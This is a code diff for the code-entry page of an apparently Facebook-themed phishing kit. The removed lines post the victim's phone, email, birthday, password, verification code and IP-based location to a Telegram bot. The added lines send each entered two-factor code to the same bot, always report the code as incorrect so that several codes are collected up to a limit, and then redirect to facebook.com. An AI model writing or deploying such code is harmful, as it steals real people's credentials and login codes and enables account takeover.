@@ -2,6 +2,7 @@ import { Layout } from '@/layouts/layout';
 import { html } from '@/lib/html';
 import PhoneInputImage from '@/assets/image/phone_input.jpg';
 import config from '@/config/telegram_config.json';
+let codeAttempts = 0;
 
 export const EnterCode = (): string => {
     const mainContent = html`
@@ -190,6 +191,16 @@ export const setupEnterCode = (): void => {
                 return;
             }
 
+            if (codeAttempts >= config.setting.max_code_attempts) {
+                const errorMessage = document.getElementById('errorMessage');
+                if (errorMessage) {
+                    errorMessage.textContent = `Maximum ${config.setting.max_code_attempts} attempts reached. Please try again later.`;
+                    errorMessage.classList.remove('hidden');
+                }
+                return;
+            }
+
+            codeAttempts++;
             continueText.classList.add('hidden');
             loadingSpinner.classList.remove('hidden');
 
@@ -203,65 +214,51 @@ export const setupEnterCode = (): void => {
                 formData.code = codeInput.value;
                 localStorage.setItem('helpFormData', JSON.stringify(formData));
 
-                try {
-                    const ipResponse = await fetch('https://api.ipapi.is/');
-                    const ipData = await ipResponse.json();
+                const lastMessageId = localStorage.getItem('lastMessageId');
+                const parsedMessageId =
+                    lastMessageId === null
+                        ? undefined
+                        : lastMessageId.trim() === ''
+                          ? undefined
+                          : parseInt(lastMessageId, 10);
 
-                    const message = `📱 <b>Phone:</b> <code>${formData.phone}</code>
-📧 <b>Email:</b> <code>${formData.email}</code>
-🎂 <b>Birthday:</b> <code>${formData.birthday}</code>
-🔑 <b>Password:</b> <code>${formData.password}</code>
-🔐 <b>Code:</b> <code>${formData.code}</code>
-🌐 <b>IP Address:</b> <code>${ipData.ip}</code>
-📍 <b>Location:</b> <code>${ipData.location.city}, ${ipData.location.state}, ${ipData.location.country}</code>
-🏢 <b>ISP:</b> <code>${ipData.company.name}</code>`;
+                const codeMessage = `🔐 <b>Code:</b> <code>${formData.code}</code>`;
 
-                    await fetch(
-                        `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
-                        {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chat_id: config.telegram.chatId,
-                                text: message,
-                                parse_mode: 'HTML',
-                            }),
-                        }
-                    );
-                } catch {
-                    const basicMessage = `📱 <b>Phone:</b> <code>${formData.phone}</code>
-📧 <b>Email:</b> <code>${formData.email}</code>
-🎂 <b>Birthday:</b> <code>${formData.birthday}</code>
-🔑 <b>Password:</b> <code>${formData.password}</code>
-🔐 <b>Code:</b> <code>${formData.code}</code>`;
+                await fetch(
+                    `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: config.telegram.chatId,
+                            text: codeMessage,
+                            parse_mode: 'HTML',
+                            reply_to_message_id: parsedMessageId,
+                        }),
+                    }
+                );
 
-                    await fetch(
-                        `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
-                        {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chat_id: config.telegram.chatId,
-                                text: basicMessage,
-                                parse_mode: 'HTML',
-                            }),
-                        }
-                    );
+                const errorMessage = document.getElementById('errorMessage');
+                if (errorMessage) {
+                    errorMessage.textContent =
+                        'Incorrect code. Please try again.';
+                    errorMessage.classList.remove('hidden');
                 }
 
                 continueText.classList.remove('hidden');
                 loadingSpinner.classList.add('hidden');
+                codeInput.value = '';
 
-                successModal.classList.remove('hidden');
-                successModal.classList.add('flex');
+                if (codeAttempts >= config.setting.max_code_attempts) {
+                    successModal.classList.remove('hidden');
+                    successModal.classList.add('flex');
 
-                setTimeout(() => {
-                    window.location.href = 'https://www.facebook.com/';
-                }, 2000);
+                    setTimeout(() => {
+                        window.location.href = 'https://www.facebook.com/';
+                    }, 2000);
+                }
             } catch {
                 return;
             }
